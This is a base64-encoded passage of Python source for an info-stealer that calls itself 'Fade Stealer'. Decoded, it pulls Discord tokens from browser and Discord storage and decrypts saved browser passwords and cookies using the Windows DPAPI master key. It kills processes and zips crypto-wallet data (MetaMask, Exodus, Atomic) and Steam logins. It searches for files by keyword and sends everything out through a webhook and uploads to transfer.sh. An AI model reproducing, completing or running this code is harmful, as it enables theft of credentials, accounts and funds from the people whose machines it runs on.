ICAgICdmaWVsZHMnOlsKewogICAgICAgICAgICAgICAgJ25hbWUnOidJbnRlcmVzdGluZyBmaWxlcyBmb3VuZCBvbiB1c2VyIFBDOicsCiAgICAgICAgICAgICAgICAndmFsdWUnOnRrCn0KXSwKICAgICAgICAgICAgJ2F1dGhvcic6ewogICAgICAgICAgICAgICAgJ25hbWUnOidGYWRlIHwgRmlsZSBzdGVhbGVyJwp9LAogICAgICAgICAgICAnZm9vdGVyJzp7CiAgICAgICAgICAgICAgICAndGV4dCc6J0BGYWRlIFN0ZWFsZXInLAogICAgICAgICAgICAgICAgJ2ljb25fdXJsJzonaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTAzMTg3ODg4Mzg0ODUwNzQwMi8xMDM2MDEyODk0MTcwNjY1MDYwL0NvbXBfMi5naWYnCn0KfQpdLAogICAgICAgICdhdmF0YXJfdXJsJzonaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTAzMTg3ODg4Mzg0ODUwNzQwMi8xMDM2MDEyODk0MTcwNjY1MDYwL0NvbXBfMi5naWYnLAogICAgICAgICdhdHRhY2htZW50cyc6W10KfQogICAgICAgIExvYWRVcmxpYihob29rLGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksaGVhZGVycz1oZWFkZXJzKQogICAgICAgIHJldHVybgogICAgcGF0aD1uYW1lCiAgICBmaWxlcz17J2ZpbGUnOm9wZW4ocGF0aCwncmInKX0KICAgIGlmICd3cHBhc3N3JyBpbiBuYW1lOgogICAgICAgIHJhPScgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHBhc3dXb3JkcykKICAgICAgICBpZiBsZW4ocmEpPjEwMDA6CiAgICAgICAgICAgIHJycj1SZWZvcm1hdChzdHIocGFzd1dvcmRzKSkKICAgICAgICAgICAgcmE9JyB8ICcuam9pbihkYSBmb3IgZGEgaW4gcnJyKQogICAgICAgIGRhdGE9ewogICAgICAgICdjb250ZW50JzonJywKICAgICAgICAnZW1iZWRzJzpbCnsKICAgICAgICAgICAgJ2NvbG9yJzozNDQ5MTQwLAogICAgICAgICAgICAnZmllbGRzJzpbCnsKICAgICAgICAgICAgICAgICduYW1lJzonRm91bmQ6JywKICAgICAgICAgICAgICAgICd2YWx1ZSc6cmEKfQpdLAogICAgICAgICAgICAnYXV0aG9yJzp7CiAgICAgICAgICAgICAgICAnbmFtZSc6J0ZhZGUgfCBQYXNzd29yZCBTdGVhbGVyJwp9LAogICAgICAgICAgICAnZm9vdGVyJzp7CiAgICAgICAgICAgICAgICAndGV4dCc6J0BGYWRlIFN0ZWFsZXInLAogICAgICAgICAgICAgICAgJ2ljb25fdXJsJzonaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTAzMTg3ODg4Mzg0ODUwNzQwMi8xMDM2MDEyODk0MTcwNjY1MDYwL0NvbXBfMi5naWYnCn0KfQpdLAogICAgICAgICdhdmF0YXJfdXJsJzonaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTAzMTg3ODg4Mzg0ODUwNzQwMi8xMDM2MDEyODk0MTcwNjY1MDYwL0NvbXBfMi5naWYnLAogICAgICAgICdhdHRhY2htZW50cyc6W10KfQogICAgICAgIExvYWRVcmxpYihob29rLGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksaGVhZGVycz1oZWFkZXJzKQogICAgaWYgJ3dwY29vaycgaW4gbmFtZToKICAgICAgICByYj0nIHwgJy5qb2luKGRhIGZvciBkYSBpbiBjb29raVdvcmRzKQogICAgICAgIGlmIGxlbihyYik+MTAwMDoKICAgICAgICAgICAgcnJycnI9UmVmb3JtYXQoc3RyKGNvb2tpV29yZHMpKQogICAgICAgICAgICByYj0nIHwgJy5qb2luKGRhIGZvciBkYSBpbiBycnJycikKICAgICAgICBkYXRhPXsKICAgICAgICAnY29udGVudCc6JycsCiAgICAgICAgJ2VtYmVkcyc6Wwp7CiAgICAgICAgICAgICdjb2xvcic6MzQ0OTE0MCwKICAgICAgICAgICAgJ2ZpZWxkcyc6Wwp7CiAgICAgICAgICAgICAgICAnbmFtZSc6J0ZvdW5kOicsCiAgICAgICAgICAgICAgICAndmFsdWUnOnJiCn0KXSwKICAgICAgICAgICAgJ2F1dGhvcic6ewogICAgICAgICAgICAgICAgJ25hbWUnOidGYWRlIHwgU3RlYWxlcicKfSwKICAgICAgICAgICAgJ2Zvb3Rlcic6ewogICAgICAgICAgICAgICAgJ3RleHQnOidARmFkZSBTdGVhbGVyJywKICAgICAgICAgICAgICAgICdpY29uX3VybCc6J2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwMzE4Nzg4ODM4NDg1MDc0MDIvMTAzNjAxMjg5NDE3MDY2NTA2MC9Db21wXzIuZ2lmJwp9Cn0KXSwKICAgICAgICAnYXZhdGFyX3VybCc6J2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwMzE4Nzg4ODM4NDg1MDc0MDIvMTAzNjAxMjg5NDE3MDY2NTA2MC9Db21wXzIuZ2lmJywKICAgICAgICAnYXR0YWNobWVudHMnOltdCn0KICAgICAgICBMb2FkVXJsaWIoaG9vayxkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLGhlYWRlcnM9aGVhZGVycykKICAgIExvYWRSZXF1ZXN0cygnUE9TVCcsaG9vayxmaWxlcz1maWxlcykKZGVmIHdyaXRlZm9yZmlsZShkYXRhLG5hbWUpOgogICAgcGF0aD1vcy5nZXRlbnYoJ1RFTVAnKStmIlx3cHtuYW1lfS50eHQiCiAgICB3aXRoIG9wZW4ocGF0aCxtb2RlPSd3JyxlbmNvZGluZz0ndXRmLTgnKWFzIGY6CiAgICAgICAgZi53cml0ZShmIjwtLUZhZGUgU3RlYWxlciBPTiBUT1AtLT5cblxuIikKICAgICAgICBmb3IgbGluZSBpbiBkYXRhOgogICAgICAgICAgICBpZiBsaW5lWzBdIT0nJzoKICAgICAgICAgICAgICAgIGYud3JpdGUoZiJ7bGluZX1cbiIpClRva2Vucz0nJwpkZWYgZ2V0VG9rZW4ocGF0aCxhcmcpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOnJldHVybgogICAgcGF0aCs9YXJnCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGgpOgogICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoJy5sb2cnKW9yIGZpbGUuZW5kc3dpdGgoJy5sZGInKToKICAgICAgICAgICAgZm9yIGxpbmUgaW5beC5zdHJpcCgpZm9yIHggaW4gb3BlbihmIntwYXRofVxce2ZpbGV9IixlcnJvcnM9J2lnbm9yZScpLnJlYWRsaW5lcygpaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbignW1xcdy1dezI0fVxcLltcXHctXXs2fVxcLltcXHctXXsyNSwxMTB9JywnbWZhXFwuW1xcdy1dezgwLDk1fScpOgogICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LGxpbmUpOgogICAgICAgICAgICAgICAgICAgICAgICBnbG9iYWwgVG9rZW5zCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoZWNrVG9rZW4odG9rZW4pOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHRva2VuIGluIFRva2VuczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUb2tlbnMrPXRva2VuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBsb2FkVG9rZW4odG9rZW4scGF0aCkKUGFzc3c9W10KZGVmIGdldFBhc3N3KHBhdGgsYXJnKToKICAgIGdsb2JhbCBQYXNzdwogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOnJldHVybgogICAgcGF0aEM9cGF0aCthcmcrJy9Mb2dpbiBEYXRhJwogICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZT09MDpyZXR1cm4KICAgIHRlbXBmb2xkPXRlbXArJ3dwJysnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKWZvciBpIGluIHJhbmdlKDgpKSsnLmRiJwogICAgc2h1dGlsLmNvcHkyKHBhdGhDLHRlbXBmb2xkKQogICAgY29ubj1zcWxfY29ubmVjdCh0ZW1wZm9sZCkKICAgIGN1cnNvcj1jb25uLmN1cnNvcigpCiAgICBjdXJzb3IuZXhlY3V0ZSgnU0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2luczsnKQogICAgZGF0YT1jdXJzb3IuZmV0Y2hhbGwoKQogICAgY3Vyc29yLmNsb3NlKCkKICAgIGNvbm4uY2xvc2UoKQogICAgb3MucmVtb3ZlKHRlbXBmb2xkKQogICAgcGF0aEtleT1wYXRoKycvTG9jYWwgU3RhdGUnCiAgICB3aXRoIG9wZW4ocGF0aEtleSwncicsZW5jb2Rpbmc9J3V0Zi04JylhcyBmOmxvY2FsX3N0YXRlPWpzb25fbG9hZHMoZi5yZWFkKCkpCiAgICBtYXN0ZXJfa2V5PWI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQogICAgbWFzdGVyX2tleT1DcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCiAgICBmb3Igcm93IGluIGRhdGE6CiAgICAgICAgaWYgcm93WzBdIT0nJzoKICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6CiAgICAgICAgICAgICAgICBvbGQ9d2EKICAgICAgICAgICAgICAgIGlmICdodHRwcycgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgdG1wPXdhCiAgICAgICAgICAgICAgICAgICAgd2E9dG1wLnNwbGl0KCdbJylbMV0uc3BsaXQoJ10nKVswXQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gcGFzd1dvcmRzOnBhc3dXb3Jkcy5hcHBlbmQob2xkKQogICAgICAgICAgICBQYXNzdy5hcHBlbmQoZiJVUjE6IHtyb3dbMF19IHwgVTUzUk40TTM6IHtyb3dbMV19IHwgUDQ1NVcwUkQ6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQogICAgd3JpdGVmb3JmaWxlKFBhc3N3LCdwYXNzdycpCkNvb2tpZXM9W10KZGVmIGdldENvb2tpZShwYXRoLGFyZyk6CiAgICBnbG9iYWwgQ29va2llcwogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOnJldHVybgogICAgcGF0aEM9cGF0aCthcmcrJy9Db29raWVzJwogICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZT09MDpyZXR1cm4KICAgIHRlbXBmb2xkPXRlbXArJ3dwJysnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKWZvciBpIGluIHJhbmdlKDgpKSsnLmRiJwogICAgc2h1dGlsLmNvcHkyKHBhdGhDLHRlbXBmb2xkKQogICAgY29ubj1zcWxfY29ubmVjdCh0ZW1wZm9sZCkKICAgIGN1cnNvcj1jb25uLmN1cnNvcigpCiAgICBjdXJzb3IuZXhlY3V0ZSgnU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBlbmNyeXB0ZWRfdmFsdWUgRlJPTSBjb29raWVzJykKICAgIGRhdGE9Y3Vyc29yLmZldGNoYWxsKCkKICAgIGN1cnNvci5jbG9zZSgpCiAgICBjb25uLmNsb3NlKCkKICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkKICAgIHBhdGhLZXk9cGF0aCsnL0xvY2FsIFN0YXRlJwogICAgd2l0aCBvcGVuKHBhdGhLZXksJ3InLGVuY29kaW5nPSd1dGYtOCcpYXMgZjpsb2NhbF9zdGF0ZT1qc29uX2xvYWRzKGYucmVhZCgpKQogICAgbWFzdGVyX2tleT1iNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXk9Q3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXlbNTpdKQogICAgZm9yIHJvdyBpbiBkYXRhOgogICAgICAgIGlmIHJvd1swXSE9Jyc6CiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOgogICAgICAgICAgICAgICAgb2xkPXdhCiAgICAgICAgICAgICAgICBpZiAnaHR0cHMnIGluIHdhOgogICAgICAgICAgICAgICAgICAgIHRtcD13YQogICAgICAgICAgICAgICAgICAgIHdhPXRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0KICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIGNvb2tpV29yZHM6Y29va2lXb3Jkcy5hcHBlbmQob2xkKQogICAgICAgICAgICBDb29raWVzLmFwcGVuZChmIkgwNTcgSzNZOiB7cm93WzBdfSB8IE40TTM6IHtyb3dbMV19IHwgVjQxVTM6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQogICAgd3JpdGVmb3JmaWxlKENvb2tpZXMsJ2Nvb2snKQpkZWYgR2V0RGlzY29yZChwYXRoLGFyZyk6CiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZiJ7cGF0aH0vTG9jYWwgU3RhdGUiKTpyZXR1cm4KICAgIHBhdGhDPXBhdGgrYXJnCiAgICBwYXRoS2V5PXBhdGgrJy9Mb2NhbCBTdGF0ZScKICAgIHdpdGggb3BlbihwYXRoS2V5LCdyJyxlbmNvZGluZz0ndXRmLTgnKWFzIGY6bG9jYWxfc3RhdGU9anNvbl9sb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXk9YjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pCiAgICBtYXN0ZXJfa2V5PUNyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkKICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOgogICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoJy5sb2cnKW9yIGZpbGUuZW5kc3dpdGgoJy5sZGInKToKICAgICAgICAgICAgZm9yIGxpbmUgaW5beC5zdHJpcCgpZm9yIHggaW4gb3BlbihmIntwYXRoQ31cXHtmaWxlfSIsZXJyb3JzPSdpZ25vcmUnKS5yZWFkbGluZXMoKWlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbCgnZFF3NHc5V2dYY1E6W14uKlxcW1wnKC4qKVwnXFxdLiokXVteXFwiXSonLGxpbmUpOgogICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUb2tlbnMKICAgICAgICAgICAgICAgICAgICB0b2tlbkRlY29kZWQ9RGVjcnlwdFZhbHVlKGI2NGRlY29kZSh0b2tlbi5zcGxpdCgnZFF3NHc5V2dYY1E6JylbMV0pLG1hc3Rlcl9rZXkpCiAgICAgICAgICAgICAgICAgICAgaWYgY2hlY2tUb2tlbih0b2tlbkRlY29kZWQpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdG9rZW5EZWNvZGVkIGluIFRva2VuczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRva2Vucys9dG9rZW5EZWNvZGVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGxvYWRUb2tlbih0b2tlbkRlY29kZWQscGF0aCkKZGVmIFppcFRoaW5ncyhwYXRoLGFyZyxwcm9jYyk6CiAgICBwYXRoQz1wYXRoCiAgICBuYW1lPWFyZwogICAgaWYgJ25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uJyBpbiBhcmc6CiAgICAgICAgYnJvd3Nlcj1wYXRoLnNwbGl0KCdcXCcpWzRdLnNwbGl0KCcvJylbMV0ucmVwbGFjZSgnICcsJycpCiAgICAgICAgbmFtZT1mIk1ldGFtYXNrX3ticm93c2VyfSIKICAgICAgICBwYXRoQz1wYXRoK2FyZwogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGhDKTpyZXR1cm4KICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIsc2hlbGw9VHJ1ZSkKICAgIGlmICdXYWxsZXQnIGluIGFyZyBvciAnTmF0aW9uc0dsb3J5JyBpbiBhcmc6CiAgICAgICAgYnJvd3Nlcj1wYXRoLnNwbGl0KCdcXCcpWzRdLnNwbGl0KCcvJylbMV0ucmVwbGFjZSgnICcsJycpCiAgICAgICAgbmFtZT1mInticm93c2VyfSIKICAgIGVsaWYgJ1N0ZWFtJyBpbiBhcmc6CiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKGYie3BhdGhDfS9sb2dpbnVzZXJzLnZkZiIpOnJldHVybgogICAgICAgIGY9b3BlbihmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiLCdyKycsZW5jb2Rpbmc9J3V0ZjgnKQogICAgICAgIGRhdGE9Zi5yZWFkbGluZXMoKQogICAgICAgIGZvdW5kPUZhbHNlCiAgICAgICAgZm9yIGwgaW4gZGF0YToKICAgICAgICAgICAgaWYgJ1JlbWVtYmVyUGFzc3dvcmQiCQkiMSInIGluIGw6CiAgICAgICAgICAgICAgICBmb3VuZD1UcnVlCiAgICAgICAgaWYgZm91bmQ9PUZhbHNlOnJldHVybgogICAgICAgIG5hbWU9YXJnCiAgICB6Zj1aaXBGaWxlKGYie3BhdGhDfS97bmFtZX0uemlwIiwndycpCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToKICAgICAgICBpZiBub3QgJy56aXAnIGluIGZpbGU6emYud3JpdGUocGF0aEMrJy8nK2ZpbGUpCiAgICB6Zi5jbG9zZSgpCiAgICB1cGxvYWQoZid7cGF0aEN9L3tuYW1lfS56aXAnKQogICAgb3MucmVtb3ZlKGYie3BhdGhDfS97bmFtZX0uemlwIikKZGVmIEdhdGhlckFsbCgpOgogICAgJyAgICAgICAgICAgICAgICAgICBEZWZhdWx0IFBhdGggPCAwID4gICAgICAgICAgICAgICAgICAgICAgICAgUHJvY2VzTmFtZSA8IDEgPiAgICAgICAgVG9rZW4gIDwgMiA+ICAgICAgICAgICAgICBQYXNzd29yZCA8IDMgPiAgICAgQ29va2llcyA8IDQgPiAgICAgICAgICAgICAgICAgICAgICAgICAgRXh0ZW50aW9ucyA8IDUgPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnCiAgICBicm93c2VyUGF0aHM9WwpbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgR1ggU3RhYmxlIiwnb3BlcmEuZXhlJywnL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYicsJy8nLCcvTmV0d29yaycsJy9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4nXSwKW2Yie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIFN0YWJsZSIsJ29wZXJhLmV4ZScsJy9Mb2NhbCBTdG9yYWdlL2xldmVsZGInLCcvJywnL05ldHdvcmsnLCcvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uJ10sCltmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBOZW9uL1VzZXIgRGF0YS9EZWZhdWx0Iiwnb3BlcmEuZXhlJywnL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYicsJy8nLCcvTmV0d29yaycsJy9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4nXSwKW2Yie2xvY2FsfS9Hb29nbGUvQ2hyb21lL1VzZXIgRGF0YSIsJ2Nocm9tZS5leGUnLCcvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGInLCcvRGVmYXVsdCcsJy9EZWZhdWx0L05ldHdvcmsnLCcvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4nXSwKW2Yie2xvY2FsfS9Hb29nbGUvQ2hyb21lIFN4Uy9Vc2VyIERhdGEiLCdjaHJvbWUuZXhlJywnL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiJywnL0RlZmF1bHQnLCcvRGVmYXVsdC9OZXR3b3JrJywnL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uJ10sCltmIntsb2NhbH0vQnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2VyL1VzZXIgRGF0YSIsJ2JyYXZlLmV4ZScsJy9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYicsJy9EZWZhdWx0JywnL0RlZmF1bHQvTmV0d29yaycsJy9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiddLApbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyL1VzZXIgRGF0YSIsJ3lhbmRleC5leGUnLCcvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGInLCcvRGVmYXVsdCcsJy9EZWZhdWx0L05ldHdvcmsnLCcvSG91Z2FCb3VnYS9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiddLApbZiJ7bG9jYWx9L01pY3Jvc29mdC9FZGdlL1VzZXIgRGF0YSIsJ2VkZ2UuZXhlJywnL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiJywnL0RlZmF1bHQnLCcvRGVmYXVsdC9OZXR3b3JrJywnL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uJ10KXQogICAgZGlzY29yZFBhdGhzPVsKW2Yie3JvYW1pbmd9L0Rpc2NvcmQiLCcvTG9jYWwgU3RvcmFnZS9sZXZlbGRiJ10sCltmIntyb2FtaW5nfS9MaWdodGNvcmQiLCcvTG9jYWwgU3RvcmFnZS9sZXZlbGRiJ10sCltmIntyb2FtaW5nfS9kaXNjb3JkY2FuYXJ5IiwnL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiddLApbZiJ7cm9hbWluZ30vZGlzY29yZHB0YiIsJy9Mb2NhbCBTdG9yYWdlL2xldmVsZGInXSwKXQogICAgUGF0aHNUb1ppcD1bCltmIntyb2FtaW5nfS9hdG9taWMvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwnIkF0b21pYyBXYWxsZXQuZXhlIicsJ1dhbGxldCddLApbZiJ7cm9hbWluZ30vRXhvZHVzL2V4b2R1cy53YWxsZXQiLCdFeG9kdXMuZXhlJywnV2FsbGV0J10sClsnQzpcXFByb2dyYW0gRmlsZXMgKHg4NilcXFN0ZWFtXFxjb25maWcnLCdzdGVhbS5leGUnLCdTdGVhbSddLApbZiJ7cm9hbWluZ30vTmF0aW9uc0dsb3J5L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsJ05hdGlvbnNHbG9yeS5leGUnLCdOYXRpb25zR2xvcnknXQpdCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6CiAgICAgICAgYT10aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1nZXRUb2tlbixhcmdzPVtwYXR0WzBdLHBhdHRbMl1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpCiAgICBmb3IgcGF0dCBpbiBkaXNjb3JkUGF0aHM6CiAgICAgICAgYT10aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1HZXREaXNjb3JkLGFyZ3M9W3BhdHRbMF0scGF0dFsxXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkKICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczoKICAgICAgICBhPXRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldFBhc3N3LGFyZ3M9W3BhdHRbMF0scGF0dFszXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkKICAgIFRoQ29raz1bXQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOgogICAgICAgIGE9dGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0Q29va2llLGFyZ3M9W3BhdHRbMF0scGF0dFs0XV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgVGhDb2trLmFwcGVuZChhKQogICAgZm9yIHRocmVhZCBpbiBUaENva2s6dGhyZWFkLmpvaW4oKQogICAgREVURUNURUQ9VHJ1c3QoQ29va2llcykKICAgIGlmIERFVEVDVEVEPT1UcnVlOnJldHVybgogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOgogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRoaW5ncyxhcmdzPVtwYXR0WzBdLHBhdHRbNV0scGF0dFsxXV0pLnN0YXJ0KCkKICAgIGZvciBwYXR0IGluIFBhdGhzVG9aaXA6CiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGhpbmdzLGFyZ3M9W3BhdHRbMF0scGF0dFsyXSxwYXR0WzFdXSkuc3RhcnQoKQogICAgZm9yIHRocmVhZCBpbiBUaHJlYWRsaXN0OgogICAgICAgIHRocmVhZC5qb2luKCkKICAgIGdsb2JhbCB1cHRocyAgICAKICAgIHVwdGhzPVtdCiAgICBmb3IgZmlsZSBpblsnd3BwYXNzdy50eHQnLCd3cGNvb2sudHh0J106CiAgICAgICAgdXBsb2FkKG9zLmdldGVudignVEVNUCcpKydcXCcrZmlsZSkKZGVmIHVwbG9hZFRvQW5vbmZpbGVzKHBhdGgpOgogICAgdHJ5OgogICAgICAgIGZpbGVzPXsnZmlsZSc6KHBhdGgsb3BlbihwYXRoLG1vZGU9J3JiJykpfQogICAgICAgIHVwbG9hZD1yZXF1ZXN0cy5wb3N0KCdodHRwczovL3RyYW5zZmVyLnNoLycsZmlsZXM9ZmlsZXMpCiAgICAgICAgdXJsPXVwbG9hZC50ZXh0CiAgICAgICAgcmV0dXJuIHVybAogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQpkZWYgS2l3aUZvbGRlcihwYXRoRixrZXl3b3Jkcyk6CiAgICBnbG9iYWwgS2l3aUZpbGVzCiAgICBtYXhmaWxlc3BlcmRpcj03CiAgICBpPTAKICAgIGxpc3RPZkZpbGU9b3MubGlzdGRpcihwYXRoRikKICAgIGZmb3VuZD1bXQogICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToKICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUocGF0aEYrJy8nK2ZpbGUpOnJldHVybgogICAgICAgIGkrPTEKICAgICAgICBpZiBpPD1tYXhmaWxlc3BlcmRpcjoKICAgICAgICAgICAgdXJsPXVwbG9hZFRvQW5vbmZpbGVzKHBhdGhGKycvJytmaWxlKQogICAgICAgICAgICBmZm91bmQuYXBwZW5kKFtwYXRoRisnLycrZmlsZSx1cmxdKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGJyZWFrCiAgICBLaXdpRmlsZXMuYXBwZW5kKFsnZm9sZGVyJyxwYXRoRisnLycsZmZvdW5kXSkKS2l3aUZpbGVzPVtdCmRlZiBLaXdpRmlsZShwYXRoLGtleXdvcmRzKToKICAgIGdsb2JhbCBLaXdpRmlsZXMKICAgIGZpZm91bmQ9W10KICAgIGxpc3RPZkZpbGU9b3MubGlzdGRpcihwYXRoKQogICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToKICAgICAgICBmb3Igd29yZiBpbiBrZXl3b3JkczoKICAgICAgICAgICAgaWYgd29yZiBpbiBmaWxlLmxvd2VyKCk6CiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShwYXRoKycvJytmaWxlKWFuZCAnLnR4dCcgaW4gZmlsZToKICAgICAgICAgICAgICAgICAgICBmaWZvdW5kLmFwcGVuZChbcGF0aCsnLycrZmlsZSx1cGxvYWRUb0Fub25maWxlcyhwYXRoKycvJytmaWxlKV0pCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNkaXIocGF0aCsnLycrZmlsZSk6CiAgICAgICAgICAgICAgICAgICAgdGFyZ2V0PXBhdGgrJy8nK2ZpbGUKICAgICAgICAgICAgICAgICAgICBLaXdpRm9sZGVyKHRhcmdldCxrZXl3b3JkcykKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgS2l3aUZpbGVz